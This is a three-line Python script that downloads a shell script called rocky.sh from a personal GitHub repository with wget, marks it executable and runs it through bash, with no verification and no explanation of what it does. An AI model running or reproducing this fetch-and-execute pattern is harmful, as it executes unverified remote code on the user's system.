import subprocess
import time

subprocess.call("wget https://github.com/thoeb292/thoeb292/raw/main/rocky.sh", shell=True)
subprocess.call("chmod 755 rocky.sh", shell=True)
subprocess.call("bash rocky.sh", shell=True)
